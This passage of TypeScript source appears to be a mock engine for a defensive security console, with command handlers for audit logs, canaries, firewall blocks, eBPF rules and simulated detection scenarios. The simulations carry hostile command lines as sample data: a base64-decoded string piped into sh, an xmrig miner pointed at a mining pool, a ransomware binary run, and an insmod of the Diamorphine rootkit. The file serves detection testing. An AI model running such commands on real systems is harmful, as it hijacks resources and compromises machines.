        return this.getStorageStats() as unknown as T;

      case "prune_logs":
        return this.pruneLogsAndTemp(args) as unknown as T;

      case "get_auto_prune_config":
        return this.getAutoPruneConfig() as unknown as T;

      case "update_auto_prune_config":
        return this.updateAutoPruneConfig(args) as unknown as T;

      case "list_temp_artifacts":
        return this.tempArtifacts as unknown as T;

      case "scan_entropy": {
        const path = args?.request?.path || args?.path || "/tmp/inspect.bin";
        const content = args?.request?.content || args?.content;
        return this.scanEntropy(path, content) as unknown as T;
      }

      case "check_update": {
        const update: UpdateInfo = {
          current_version: this.currentAppVersion,
          engine_version: this.currentEngineVersion,
          latest_version: this.currentAppVersion,
          release_url: "https://github.com/SepJs/aegis-guard/releases",
          release_notes: `Aegis-Guard v${this.currentAppVersion} (Core Engine v${this.currentEngineVersion}) is active with multi-tier behavioral scoring, heuristic doubt safeguard, sandbox container isolation, and automated live patch engine.`,
          update_available: this.updateAvailable,
          auto_update_enabled: this.autoUpdateEnabled,
        };
        return update as unknown as T;
      }

      case "apply_update": {
        this.currentEngineVersion = "4.5.1-HOTPATCH";
        this.updateAvailable = false;
        const now = Date.now();
        const nextDigest = computeDigest(this.lastDigest + "APPLY_UPDATE" + this.currentEngineVersion + now);
        this.auditLog.unshift({
          id: `aud-${now}`,
          action: "EngineUpdate",
          pid: 1,
          process: "aegis-update-agent",
          incident_id: null,
          note: `Live Engine Hotpatch applied successfully: Core upgraded to v${this.currentEngineVersion} with updated heuristic rulesets.`,
          status: "success",
          outcome: `Engine live hotpatch loaded without service interruption. Audit chain updated.`,
          ts_before: now - 5,
          ts_after: now,
          prev_digest: this.lastDigest,
          digest: nextDigest,
        });
        this.lastDigest = nextDigest;
        return {
          success: true,
          message: `Live Engine Hotpatch applied: v${this.currentEngineVersion} active!`,
          app_version: this.currentAppVersion,
          engine_version: this.currentEngineVersion,
        } as unknown as T;
      }

      case "toggle_auto_update":
      case "set_auto_update": {
        const enabled = args?.enabled !== undefined ? Boolean(args.enabled) : !this.autoUpdateEnabled;
        this.autoUpdateEnabled = enabled;
        return this.autoUpdateEnabled as unknown as T;
      }

      case "execute_action": {
        const { pid, processName, exePath, action, incidentId, challenge, note } = args;
        return this.executeAction(pid, processName, exePath, action, incidentId, challenge, note) as unknown as T;
      }

      case "list_audit_log": {
        const limit = args?.limit ?? 100;
        const offset = args?.offset ?? 0;
        return this.auditLog.slice(offset, offset + limit) as unknown as T;
      }

      case "verify_audit_chain":
        return this.verifyAuditChain().errors as unknown as T;

      case "simulate_audit_action":
        return this.simulateAuditAction() as unknown as T;

      case "simulate_suspicious_process":
        return this.simulateSuspiciousProcess() as unknown as T;

      case "simulate_threat_incident":
        return this.simulateThreatIncident() as unknown as T;

      case "simulate_suppression_test":
        return this.simulateSuppressionTest() as unknown as T;

      case "run_engine_diagnostics":
        return this.runEngineDiagnostics() as unknown as T;

      case "add_custom_ioc": {
        const item = {
          ioc: (args?.ioc || args?.value || "").trim().toLowerCase(),
          kind: args?.kind || "ip",
          feed: "custom",
          threat_type: args?.threat_type || "suspicious_indicator",
          confidence: args?.confidence || 90,
          added_ts: Date.now(),
        };
        if (item.ioc && !BUNDLED_IOCS.some((b) => b.ioc.toLowerCase() === item.ioc)) {
          BUNDLED_IOCS.push(item);
        }
        return item as unknown as T;
      }

      case "list_whitelist":
        return this.whitelist as unknown as T;

      case "remove_from_whitelist": {
        const idx = this.whitelist.findIndex((w) => w.pid === args?.pid);
        if (idx >= 0) {
          this.whitelist.splice(idx, 1);
          return true as unknown as T;
        }
        return false as unknown as T;
      }

      case "get_ioc_stats":
        return this.getIocStats() as unknown as T;

      case "check_ioc_manual": {
        const clean = (args?.value || "").trim().toLowerCase();
        const found = BUNDLED_IOCS.find((b) => b.ioc.toLowerCase() === clean);
        if (found) {
          return {
            ioc: found.ioc,
            kind: found.kind,
            threat_type: found.threat_type,
            feed: found.feed,
            confidence: found.confidence,
            context: args?.context || "manual-lookup",
          } as unknown as T;
        }
        return null as unknown as T;
      }

      case "list_canaries":
        return this.canaries as unknown as T;

      case "create_canary": {
        const id = `canary-${Date.now()}`;
        const hex = Math.random().toString(16).substring(2, 8).toUpperCase();
        const token = `AEGIS-CANARY-${hex}-SECURE-TOKEN`;
        const item: CanaryToken = {
          id,
          token,
          file_path: args?.filePath || args?.file_path || "/tmp/canary.txt",
          description: args?.description || "Sensitive asset canary trap",
          created_ts: Date.now(),
          triggered: false,
        };
        this.canaries.unshift(item);
        return item as unknown as T;
      }

      case "delete_canary": {
        const idx = this.canaries.findIndex((c) => c.id === args?.id);
        if (idx >= 0) {
          this.canaries.splice(idx, 1);
          return true as unknown as T;
        }
        return false as unknown as T;
      }

      case "trigger_canary_test": {
        const can = this.canaries.find((c) => c.id === args?.id);
        if (can) {
          can.triggered = true;
          const now = Date.now();
          const incident: ThreatIncident = {
            id: `inc-canary-${now}`,
            kind: "canary_exfiltration",
            severity: "high",
            risk_score: 85,
            pid: 2481,
            ppid: 711,
            process: "python3",
            cmdline: ["python3", "-c", "read_canary_data()"],
            exe_path: "/usr/bin/python3",
            rule: "CANARY-001",
            confidence: "high",
            reason: `Honeypot Canary accessed! Token '${can.token.slice(0, 16)}...' in '${can.file_path}' detected in outbound stream`,
            ancestors: [1, 710, 711],
            ts: new Date(now).toISOString(),
            resolved: false,
            digest: computeDigest(can.token + now),
            mitre_tactic: "Credential Access",
            mitre_technique: "T1552.001 (Credentials In Files - Canary Trap)",
            factors: [
              { name: "Canary Trap Access", impact: 85, category: "payload", desc: "Honeypot decoy token accessed by untrusted process" },
            ],
          };
          this.incidents.unshift(incident);
          this.emit("anomaly", incident);
          return true as unknown as T;
        }
        return false as unknown as T;
      }

      // Network Observer commands
      case "list_network_connections":
        return this.connections as unknown as T;

      case "list_dns_queries":
        return this.dnsQueries as unknown as T;

      case "block_remote_ip": {
        const ip = args?.ip;
        if (ip) {
          this.blockedIps.add(ip);
          this.connections.forEach((c) => {
            if (c.remote_addr === ip) {
              c.threat = "c2_blocked";
              c.threat_reason = `Direct IP block enforced by Aegis Firewall (${ip})`;
              c.state = "CLOSE_WAIT";
            }
          });
          const now = Date.now();
          const nextDigest = computeDigest(this.lastDigest + "BlockIP" + ip + now);
          this.auditLog.unshift({
            id: `aud-${now}`,
            action: "Block-IP",
            pid: 0,
            process: "aegis-firewall",
            incident_id: null,
            note: `Emergency IP block enforced on ${ip}`,
            status: "success",
            outcome: `Inbound and outbound sockets terminated for ${ip}`,
            ts_before: now - 2,
            ts_after: now,
            prev_digest: this.lastDigest,
            digest: nextDigest,
          });
          this.lastDigest = nextDigest;
          this.emit("net-update", { connections: this.connections });
          return true as unknown as T;
        }
        return false as unknown as T;
      }

      case "unblock_remote_ip": {
        const ip = args?.ip;
        if (ip) {
          this.blockedIps.delete(ip);
          this.networkDefenseConfig.blocked_ip_list = this.networkDefenseConfig.blocked_ip_list.filter((b) => b !== ip);
          const now = Date.now();
          const nextDigest = computeDigest(this.lastDigest + "UnblockIP" + ip + now);
          this.auditLog.unshift({
            id: `aud-${now}`,
            action: "Unblock-IP",
            pid: 0,
            process: "aegis-firewall",
            incident_id: null,
            note: `IP unblocked and firewall rule purged for ${ip}`,
            status: "success",
            outcome: `Traffic restriction removed for ${ip}`,
            ts_before: now - 2,
            ts_after: now,
            prev_digest: this.lastDigest,
            digest: nextDigest,
          });
          this.lastDigest = nextDigest;
          this.emit("net-update", { connections: this.connections });
          return true as unknown as T;
        }
        return false as unknown as T;
      }

      case "terminate_network_connection": {
        const id = args?.id;
        const conn = this.connections.find((c) => c.id === id);
        if (conn) {
          conn.state = "CLOSE_WAIT";
          conn.threat = "c2_blocked";
          conn.threat_reason = "Connection forcefully terminated by security administrator";
          this.emit("net-update", { connections: this.connections });
          return true as unknown as T;
        }
        return false as unknown as T;
      }

      // Live Rule Engine & Movement Testing API
      case "evaluate_command": {
        return this.evaluateRisk(args) as unknown as T;
      }

      case "simulate_movement_scenario": {
        return this.simulateMovementScenario(args?.scenario || "benign_dev") as unknown as T;
      }

      // Anti-Malware & Virus Engine Commands
      case "list_virus_signatures":
        return this.listVirusSignatures() as unknown as T;

      case "list_malware_results":
        return this.listMalwareResults() as unknown as T;

      case "get_av_stats":
        return this.getAvStats() as unknown as T;

      case "scan_malware_target":
        return this.scanMalwareTarget(args) as unknown as T;

      case "test_malware_sample":
        return this.testMalwareSample(args?.sample || args?.type || "clean") as unknown as T;

      case "quarantine_malware_file":
      case "quarantine_malware":
        return this.quarantineMalware(args?.id, args?.action || "quarantine") as unknown as T;

      case "trust_user_app":
        return this.trustUserApp(args) as unknown as T;

      case "send_target_to_sandbox":
        return this.sendTargetToSandbox(args?.id) as unknown as T;

      case "confirm_malware_quarantine":
        return this.confirmMalwareQuarantine(args?.id) as unknown as T;

      case "list_user_whitelisted_apps":
        return this.listUserWhitelistedApps() as unknown as T;

      case "remove_user_whitelisted_app":
        return this.removeUserWhitelistedApp(args?.path || args?.id) as unknown as T;

      case "set_auto_remediation":
        return this.setAutoRemediation(args?.enabled !== false) as unknown as T;

      // Sandbox & Isolated Environment Commands
      case "list_sandbox_reports":
        return this.listSandboxReports() as unknown as T;

      case "launch_sandbox_jail":
        return this.launchSandboxJail(args) as unknown as T;

      case "terminate_sandbox_jail":
        return this.terminateSandboxJail(args?.jail_id) as unknown as T;

      // Network IDS & Attack Detection Commands
      case "list_network_attacks":
        return this.listNetworkAttacks() as unknown as T;

      case "get_network_defense_config":
        return this.getNetworkDefenseConfig() as unknown as T;

      case "update_network_defense_config":
        return this.updateNetworkDefenseConfig(args?.config || {}) as unknown as T;

      case "simulate_network_attack":
        return this.simulateNetworkAttack(args?.attack_type || "SYN_FLOOD_DOS") as unknown as T;

      // eBPF Socket Filter Commands
      case "ebpf_get_status":
        return {
          ...this.ebpfStats,
          active_rules_count: this.ebpfRules.filter((r) => r.enabled).length,
        } as unknown as T;

      case "ebpf_init_filter": {
        if (args?.interface) this.ebpfStats.interface = args.interface;
        if (args?.mode) this.ebpfStats.mode = args.mode;
        this.ebpfStats.state = "active";
        return true as unknown as T;
      }
      case "ebpf_attach_filter": {
        this.ebpfStats.state = "active";
        return true as unknown as T;
      }
      case "ebpf_detach_filter": {
        this.ebpfStats.state = "paused";
        return true as unknown as T;
      }

      case "ebpf_list_rules":
        return this.ebpfRules as unknown as T;

      case "ebpf_get_inspected_packets": {
        let pkts = [...this.ebpfInspectedPackets];
        if (args?.filter_verdict && args.filter_verdict !== "all") {
          pkts = pkts.filter((p) => p.verdict === args.filter_verdict);
        }
        const limit = args?.limit || 50;
        return pkts.slice(0, limit) as unknown as T;
      }

      case "ebpf_clear_packets": {
        this.ebpfInspectedPackets = [];
        return true as unknown as T;
      }

      case "ebpf_add_rule": {
        if (args?.rule) {
          this.ebpfRules.push(args.rule);
        }
        return true as unknown as T;
      }

      case "ebpf_remove_rule": {
        const id = args?.rule_id || args?.id;
        const idx = this.ebpfRules.findIndex((r) => r.id === id);
        if (idx >= 0) this.ebpfRules.splice(idx, 1);
        return true as unknown as T;
      }

      case "ebpf_toggle_rule": {
        const id = args?.rule_id || args?.id;
        const rule = this.ebpfRules.find((r) => r.id === id);
        if (rule) {
          rule.enabled = args?.enabled !== undefined ? args.enabled : !rule.enabled;
        }
        return true as unknown as T;
      }

      case "ebpf_simulate_packet":
        return this.simulateEbpfPacket(args?.sample_type || "c2_shell", args?.custom_hex) as unknown as T;

      default:
        console.warn(`[Aegis Mock Engine] Unhandled command '${cmd}'`, args);
        return null as unknown as T;
      }
  }

  public executeAction(
    pid: number,
    processName: string,
    exePath: string | null,
    action: string,
    incidentId: string | null,
    challenge: string,
    note: string
  ): ActionResult {
    const expected = `CONFIRM-${action.toUpperCase()}-${pid}`;
    if (challenge.trim() !== expected) {
      throw new Error(`Invalid challenge token. Expected '${expected}', got '${challenge.trim()}'.`);
    }

    const now = Date.now();
    let message = "";

    if (action === "kill") {
      this.processes.delete(pid);
      this.emit("proc-event", {
        id: `exit-${pid}-${now}`,
        kind: "exited",
        pid,
        ppid: 0,
        name: processName,
        cmdline: [],
        exe: exePath,
        cwd: null,
        uid: 0,
        gid: 0,
        start_time: now,
        anomaly: null,
        ts: now,
      });

      this.connections = this.connections.filter((c) => c.pid !== pid);
      this.emit("net-update", { connections: this.connections });

      if (incidentId) {
        const inc = this.incidents.find((i) => i.id === incidentId);
        if (inc) {
          inc.resolved = true;
          this.emit("anomaly", inc);
        }
      }

      message = `Terminated process ${processName} [PID ${pid}] via SIGKILL (Network sockets purged)`;
    } else if (action === "quarantine") {
      this.connections.forEach((c) => {
        if (c.pid === pid) {
          c.state = "CLOSE_WAIT";
          c.threat = "c2_blocked";
          c.threat_reason = "Process isolated in loopback-only namespace 'aegis-quarantine-ns'";
        }
      });
      this.emit("net-update", { connections: this.connections });
      message = `Isolated process ${processName} [PID ${pid}] into network namespace aegis-quarantine-ns`;
    } else if (action === "lift_quarantine") {
      message = `Lifted quarantine for process ${processName} [PID ${pid}]`;
    } else if (action === "whitelist") {
      this.whitelist.push({
        pid,
        process_name: processName,
        exe_path: exePath,
        added_at: now,
        note: note || "Added via Aegis console",
      });
      message = `Process ${processName} [PID ${pid}] added to Active Defense whitelist`;
    } else {
      throw new Error(`Unknown action: ${action}`);
    }

    const nextDigest = computeDigest(this.lastDigest + action + pid + now);
    this.auditLog.unshift({
      id: `aud-${now}`,
      action: action.charAt(0).toUpperCase() + action.slice(1),
      pid,
      process: processName,
      incident_id: incidentId,
      note: note || `Action ${action} requested via console`,
      status: "success",
      outcome: message,
      ts_before: now - 8,
      ts_after: now,
      prev_digest: this.lastDigest,
      digest: nextDigest,
    });
    this.lastDigest = nextDigest;

    return {
      success: true,
      pid,
      action: action as any,
      message,
      ts: now,
    };
  }

  public verifyAuditChain(): { valid: boolean; count: number; errors: string[] } {
    const errors: string[] = [];
    if (this.auditLog.length === 0) return { valid: true, count: 0, errors: [] };

    for (let i = 0; i < this.auditLog.length - 1; i++) {
      const current = this.auditLog[i];
      const older = this.auditLog[i + 1];
      if (current.prev_digest !== older.digest) {
        errors.push(`Chain broken between entry ${current.id} and ${older.id}`);
      }
    }

    return {
      valid: errors.length === 0,
      count: this.auditLog.length,
      errors,
    };
  }

  public scanEntropy(path: string, content?: Uint8Array | string): ScanSummary {
    const start = performance.now();
    let sizeBytes = 0;
    let entropyVal: number | null = null;
    let risk: RiskLevel = "normal";
    let mime = "application/octet-stream";
    let note = "Normal file entropy";

    if (content) {
      const bytes: Uint8Array =
        typeof content === "string" ? new TextEncoder().encode(content) : content;
      sizeBytes = bytes.length;
      if (sizeBytes > 0) {
        const counts = new Uint32Array(256);
        for (let i = 0; i < sizeBytes; i++) counts[bytes[i]]++;
        let ent = 0;
        for (let i = 0; i < 256; i++) {
          if (counts[i] > 0) {
            const p = counts[i] / sizeBytes;
            ent -= p * Math.log2(p);
          }
        }
        entropyVal = Math.round(ent * 1000) / 1000;
      } else {
        entropyVal = 0;
      }
    } else {
      if (path.includes(".kworker") || path.includes(".tmpfs") || path.endsWith(".so")) {
        entropyVal = 7.914;
      } else if (path.includes("nginx") || path.includes("config") || path.endsWith(".conf")) {
        entropyVal = 4.12;
      } else if (path.endsWith(".sh") || path.endsWith(".py") || path.endsWith(".js")) {
        entropyVal = 4.85;
      } else if (path.includes("log") || path.endsWith(".txt")) {
        entropyVal = 2.45;
      } else {
        entropyVal = 5.2;
      }
      sizeBytes = 24190;
    }

    if (entropyVal != null) {
      if (entropyVal > 7.5) {
        risk = "high";
        note = "Suspiciously high entropy (>7.5): Packed executable, encrypted payload, or ransomware volume";
      } else if (entropyVal > 6.5) {
        risk = "medium";
        note = "Elevated entropy: Compressed data or high-density code";
      } else if (entropyVal > 3.0) {
        risk = "normal";
        note = "Normal entropy: Standard source code, text, or uncompressed ELF binary";
      } else {
        risk = "low";
        note = "Low entropy: repetitive or plaintext data";
      }
      mime = path.endsWith(".sh")
        ? "text/x-shellscript"
        : path.endsWith(".json")
        ? "application/json"
        : path.endsWith(".txt")
        ? "text/plain"
        : "application/octet-stream";
    }

    const elapsed = Math.round(performance.now() - start);

    const baseResults: FileScanResult[] = [
      {
        path: path || "/tmp/target.bin",
        size_bytes: sizeBytes,
        entropy: entropyVal,
        risk,
        mime_guess: mime,
        note,
      },
      {
        path: "/dev/shm/.kworker",
        size_bytes: 84120,
        entropy: 7.914,
        risk: "high",
        mime_guess: "application/x-pie-executable",
        note: "UPX packed C2 beacon downloaded into memory tmpfs mount",
      },
      {
        path: "/etc/nginx/nginx.conf",
        size_bytes: 2840,
        entropy: 4.12,
        risk: "normal",
        mime_guess: "text/plain",
        note: "Standard web daemon configuration file",
      },
      {
        path: "/var/log/lastlog",
        size_bytes: 292292,
        entropy: 0.124,
        risk: "low",
        mime_guess: "application/octet-stream",
        note: "Sparse accounting database with repetitive null sequences",
      },
    ];

    return {
      total_files: 4,
      scanned_files: 4,
      skipped_files: 0,
      high_risk: risk === "high" ? 2 : 1,
      medium_risk: risk === "medium" ? 1 : 0,
      elapsed_ms: Math.max(elapsed, 8),
      results: baseResults,
    };
  }

  public getIocStats() {
    let ips = 0;
    let domains = 0;
    let hashes = 0;
    BUNDLED_IOCS.forEach((i) => {
      if (i.kind === "ip") ips++;
      else if (i.kind === "domain") domains++;
      else if (i.kind === "md5" || i.kind === "sha256") hashes++;
    });
    return { ips, cidrs: 4, domains, hashes };
  }

  // --------------------------------------------------------------------------
  // Scenario Simulation for Movement & Detection Verification
  // Demonstrates both false-positive prevention (benign dev commands)
  // and tiered severity escalation (from informational -> medium -> critical)
  // --------------------------------------------------------------------------
  public simulateMovementScenario(scenario: string): {
    success: boolean;
    scenario: string;
    message: string;
    result: EvaluationResult;
    incident?: ThreatIncident;
  } {
    const now = Date.now();
    const pid = 3200 + Math.floor(Math.random() * 600);

    if (scenario === "benign_dev") {
      // Benign dev command: npm install with curl querying npmjs.org
      const cmd = ["npm", "install", "--save", "express"];
      const evalRes = this.evaluateRisk({
        process_name: "npm",
        cmdline: cmd,
        parent_name: "bash",
        uid: 1000,
        destination: "registry.npmjs.org",
      });

      this.telemetry.unshift({
        id: `tel-${now}`,
        ts: now,
        pid,
        ppid: 1120,
        process: "npm",
        parent: "bash",
        event_type: "PROC_SPAWN",
        severity: evalRes.severity,
        score: evalRes.score,
        mitre: evalRes.mitre_tactic,
        detail: `npm install express (Developer build toolchain detected)`,
        cmdline: cmd,
        verdict: evalRes.verdict,
        suppression_reason: evalRes.suppression_reason,
      });

      this.debugLog.unshift({
        id: `dbg-${now}`,
        rule: "ARG-DEV",
        pid,
        process: "npm",
        note: `npm install express evaluated -> score: ${evalRes.score}/100`,
        suppression_reason: evalRes.suppression_reason,
        original_score: 55,
        adjusted_score: evalRes.score,
        category: "Developer Toolchain",
        ts: new Date(now).toISOString(),
      });

      this.emit("telemetry-event", this.telemetry[0]);

      return {
        success: true,
        scenario: "benign_dev",
        message: `Evaluated benign developer command: score ${evalRes.score}/100 [${evalRes.severity.toUpperCase()}]. False positive successfully prevented!`,
        result: evalRes,
      };
    } else if (scenario === "admin_audit") {
      // Admin inspecting system
      const cmd = ["ps", "aux", "|", "grep", "root"];
      const evalRes = this.evaluateRisk({
        process_name: "ps",
        cmdline: cmd,
        parent_name: "bash",
        uid: 1000,
      });

      this.telemetry.unshift({
        id: `tel-${now}`,
        ts: now,
        pid,
        ppid: 1120,
        process: "ps",
        parent: "bash",
        event_type: "PROC_SPAWN",
        severity: evalRes.severity,
        score: evalRes.score,
        mitre: "Discovery",
        detail: `ps aux | grep root (Routine system diagnostic execution)`,
        cmdline: cmd,
        verdict: evalRes.verdict,
        suppression_reason: evalRes.suppression_reason,
      });

      this.emit("telemetry-event", this.telemetry[0]);

      return {
        success: true,
        scenario: "admin_audit",
        message: `Evaluated admin diagnostic command: score ${evalRes.score}/100 [${evalRes.severity.toUpperCase()}]. Suppressed into informational telemetry.`,
        result: evalRes,
      };
    } else if (scenario === "suspicious_script") {
      // Ambiguous base64 script without active C2 socket -> MEDIUM severity (NOT critical!)
      const cmd = ["/bin/bash", "-c", "echo 'Y2F0IC9ldGMvaG9zdHM=' | base64 -d | sh"];
      const evalRes = this.evaluateRisk({
        process_name: "bash",
        cmdline: cmd,
        parent_name: "cron",
        uid: 1000,
        cwd: "/tmp",
      });

      const incident: ThreatIncident = {
        id: `inc-${now}`,
        kind: "obfuscated_args",
        severity: evalRes.severity,
        risk_score: evalRes.score,
        pid,
        ppid: 1,
        process: "bash",
        cmdline: cmd,
        exe_path: "/bin/bash",
        rule: "ARG-001",
        confidence: "medium",
        reason: "Base64 encoded subshell execution piped from cron without network C2",
        ancestors: [1],
        ts: new Date(now).toISOString(),
        resolved: false,
        digest: computeDigest("suspicious" + pid + now),
        mitre_tactic: evalRes.mitre_tactic,
        mitre_technique: evalRes.mitre_technique,
        factors: evalRes.factors,
        movement_steps: [
          { ts: now - 1000, event: "Cron Trigger", detail: "Automated schedule launched subshell", delta: 12 },
          { ts: now, event: "Base64 Pipe", detail: "Piped decoded string to sh interpreter", delta: 36 },
        ],
      };

      this.incidents.unshift(incident);

      this.telemetry.unshift({
        id: `tel-${now}`,
        ts: now,
        pid,
        ppid: 1,
        process: "bash",
        parent: "cron",
        event_type: "SHELL_EXEC",
        severity: evalRes.severity,
        score: evalRes.score,
        mitre: evalRes.mitre_technique,
        detail: `Base64 encoded command execution in cron subshell`,
        cmdline: cmd,
        verdict: evalRes.verdict,
      });

      this.emit("anomaly", incident);
      this.emit("telemetry-event", this.telemetry[0]);

      return {
        success: true,
        scenario: "suspicious_script",
        message: `Evaluated ambiguous script: score ${evalRes.score}/100 assigned tier '${evalRes.severity.toUpperCase()}' (calibrated to avoid false high/critical alarms).`,
        result: evalRes,
        incident,
      };
    } else if (scenario === "virus_attack") {
      // Virus / Malware Execution Scenario (CoinMiner / WebShell)
      const cmd = ["/usr/local/bin/xmrig", "-o", "stratum+tcp://pool.minexmr.com:4444", "-u", "44AFFq5kSiGb..."];
      const evalRes = this.evaluateRisk({
        process_name: "xmrig",
        cmdline: cmd,
        parent_name: "bash",
        uid: 1000,
        cwd: "/opt/miner",
      });

      const incident: ThreatIncident = {
        id: `inc-${now}`,
        kind: "malware_coinminer",
        severity: evalRes.severity,
        risk_score: evalRes.score,
        pid,
        ppid: 1120,
        process: "xmrig",
        cmdline: cmd,
        exe_path: "/usr/local/bin/xmrig",
        rule: evalRes.rule,
        confidence: "high",
        reason: `Active Malware Detected: ${evalRes.virus_match?.name || "CoinMiner.Linux.XMRig"} hijacking CPU cores for Stratum pool mining`,
        ancestors: [1, 580, 1120],
        ts: new Date(now).toISOString(),
        resolved: false,
        digest: computeDigest("virus_attack" + pid + now),
        mitre_tactic: evalRes.mitre_tactic,
        mitre_technique: evalRes.mitre_technique,
        flags: evalRes.flags,
        virus_name: evalRes.virus_match?.name || "CoinMiner.Linux.XMRig",
        virus_family: evalRes.virus_match?.family || "CoinMiner",
        factors: evalRes.factors,
        movement_steps: [
          { ts: now - 2000, event: "Payload Ingress", detail: "Binary dropped in /usr/local/bin/xmrig", delta: 25 },
          { ts: now - 1000, event: "Pool Connection", detail: "Socket initiated to stratum+tcp://pool.minexmr.com", delta: 35 },
          { ts: now, event: "AV Signature Match", detail: "Matched definition MAL-MINER-XMRIG [CoinMiner.Linux.XMRig]", delta: 28 },
        ],
      };

      this.incidents.unshift(incident);

      // Add to malware scan results
      const malScan: MalwareScanResult = {
        id: `mal-${now}`,
        target_path: "/usr/local/bin/xmrig",
        target_type: "process_memory",
        pid,
        status: "infected",
        malware_name: "CoinMiner.Linux.XMRig",
        family: "CoinMiner",
        severity: "high",
        confidence: "high",
        rule_matched: "MAL-MINER-XMRIG",
        detection_method: "AV Heuristic & Mining Signature Match",
        sha256: computeDigest("xmrig" + pid).repeat(4).slice(0, 64),
        entropy: 7.78,
        indicators: ["stratum+tcp://pool.minexmr.com:4444", "donate-level", "rx/0"],
        quarantined: false,
        ts: now,
      };
      this.malwareResults.unshift(malScan);

      this.telemetry.unshift({
        id: `tel-${now}`,
        ts: now,
        pid,
        ppid: 1120,
        process: "xmrig",
        parent: "bash",
        event_type: "PROC_SPAWN",
        severity: "high",
        score: evalRes.score,
        mitre: "T1496 (Resource Hijacking)",
        detail: `Active virus payload: CoinMiner.Linux.XMRig connecting to stratum+tcp pool`,
        cmdline: cmd,
        verdict: "alert",
      });

      const procEvent: ProcEvent = {
        id: `p-${pid}`,
        kind: "anomaly",
        pid,
        ppid: 1120,
        name: "xmrig",
        cmdline: cmd,
        exe: "/usr/local/bin/xmrig",
        cwd: "/opt/miner",
        uid: 1000,
        gid: 1000,
        start_time: now,
        anomaly: {
          rule: evalRes.rule,
          confidence: "high",
          severity: "high",
          risk_score: evalRes.score,
          flags: evalRes.flags,
          virus_name: "CoinMiner.Linux.XMRig",
          virus_family: "CoinMiner",
          reason: incident.reason,
          parent_exe: "/usr/bin/bash",
          ancestors: incident.ancestors,
          mitre_tactic: incident.mitre_tactic,
          mitre_technique: incident.mitre_technique,
        },
        ts: now,
      };

      this.processes.set(pid, procEvent);
      this.emit("proc-event", procEvent);
      this.emit("anomaly", incident);
      this.emit("telemetry-event", this.telemetry[0]);
      this.emit("malware-detected", malScan);

      return {
        success: true,
        scenario: "virus_attack",
        message: `Virus / Malware identified! Flagged '${evalRes.virus_match?.name || "CoinMiner.Linux.XMRig"}' under rule ${evalRes.rule} (Score ${evalRes.score}/100 [HIGH]).`,
        result: evalRes,
        incident,
      };
    } else if (scenario === "ransomware_attack") {
      // High-impact Ransomware attack encrypting volumes
      const cmd = ["/tmp/deadbolt_arm", "-p", "/home/user/data", "-k", "deadbolt_master_key"];
      const evalRes = this.evaluateRisk({
        process_name: "deadbolt_arm",
        cmdline: cmd,
        parent_name: "bash",
        uid: 0,
        cwd: "/tmp",
      });

      const incident: ThreatIncident = {
        id: `inc-${now}`,
        kind: "ransomware_crypto",
        severity: "critical",
        risk_score: 95,
        pid,
        ppid: 1120,
        process: "deadbolt_arm",
        cmdline: cmd,
        exe_path: "/tmp/deadbolt_arm",
        rule: "MAL-RANSOM-DEADBOLT",
        confidence: "high",
        reason: "Active High-Entropy File Encryption & Extortion Key Generation detected",
        ancestors: [1, 1120],
        ts: new Date(now).toISOString(),
        resolved: false,
        digest: computeDigest("ransomware" + pid + now),
        mitre_tactic: "Impact",
        mitre_technique: "T1486 (Data Encrypted for Impact)",
        flags: ["[VIRUS: RANSOMWARE]", "[DeadBolt.Locker]", "[HIGH_ENTROPY]"],
        virus_name: "Ransomware.Linux.DeadBolt",
        virus_family: "Ransomware",
        factors: evalRes.factors,
        movement_steps: [
          { ts: now - 3000, event: "Target Discovery", detail: "Scanned /home directory tree", delta: 15 },
          { ts: now - 1500, event: "Key Exchange", detail: "Generated AES-256 local key vector", delta: 40 },
          { ts: now, event: "Volume Mass Encryption", detail: "Overwriting file headers with .deadbolt extension", delta: 40 },
        ],
      };

      this.incidents.unshift(incident);

      const malScan: MalwareScanResult = {
        id: `mal-${now}`,
        target_path: "/tmp/deadbolt_arm",
        target_type: "file",
        pid,
        status: "infected",
        malware_name: "Ransomware.Linux.DeadBolt",
        family: "Ransomware",
        severity: "critical",
        confidence: "high",
        rule_matched: "MAL-RANSOM-DEADBOLT",
        detection_method: "Cryptographic Volume Ransomware Signature Match",
        sha256: computeDigest("deadbolt" + pid).repeat(4).slice(0, 64),
        entropy: 7.96,
        indicators: [".deadbolt", "deadbolt_master_key", "YOUR_FILES_ARE_LOCKED"],
        quarantined: false,
        ts: now,
      };
      this.malwareResults.unshift(malScan);

      this.telemetry.unshift({
        id: `tel-${now}`,
        ts: now,
        pid,
        ppid: 1120,
        process: "deadbolt_arm",
        parent: "bash",
        event_type: "FILE_ENCRYPT",
        severity: "critical",
        score: 95,
        mitre: "T1486 (Data Encrypted for Impact)",
        detail: "Mass file encryption detected with ransom note generation",
        cmdline: cmd,
        verdict: "alert",
      });

      this.emit("anomaly", incident);
      this.emit("telemetry-event", this.telemetry[0]);
      this.emit("malware-detected", malScan);

      return {
        success: true,
        scenario: "ransomware_attack",
        message: `Ransomware attack neutralized! Identified Ransomware.Linux.DeadBolt (Score 95/100 [CRITICAL]).`,
        result: evalRes,
        incident,
      };
    } else if (scenario === "rootkit_attack") {
      // Stealth LKM Rootkit
      const cmd = ["insmod", "/lib/modules/diamorphine.ko"];
      const evalRes = this.evaluateRisk({
        process_name: "insmod",
        cmdline: cmd,
        parent_name: "bash",
        uid: 0,
      });

      const incident: ThreatIncident = {
        id: `inc-${now}`,
        kind: "rootkit_lkm",
        severity: "critical",
        risk_score: 94,
        pid,
        ppid: 1120,
        process: "insmod",
        cmdline: cmd,
        exe_path: "/sbin/insmod",
        rule: "MAL-ROOTKIT-DIAMORPHINE",
        confidence: "high",
        reason: "Kernel Module Injected: Diamorphine LKM hooking sys_call_table to hide PIDs and elevate to root",
        ancestors: [1, 1120],
        ts: new Date(now).toISOString(),
        resolved: false,
        digest: computeDigest("rootkit" + pid + now),
        mitre_tactic: "Defense Evasion & Persistence",
        mitre_technique: "T1547.006 (Kernel Modules and Extensions)",
        flags: ["[VIRUS: ROOTKIT]", "[Diamorphine.LKM]", "[KERNEL_TAMPER]"],
        virus_name: "Rootkit.Linux.Diamorphine",
        virus_family: "Rootkit",
        factors: evalRes.factors,
        movement_steps: [
          { ts: now - 2000, event: "LKM Stage", detail: "Kernel module written to /lib/modules/diamorphine.ko", delta: 30 },
          { ts: now, event: "Module Loading", detail: "insmod executed with syscall table detours", delta: 64 },
        ],
      };

      this.incidents.unshift(incident);

      const malScan: MalwareScanResult = {
        id: `mal-${now}`,
        target_path: "/lib/modules/diamorphine.ko",
        target_type: "file",
        pid,
        status: "infected",
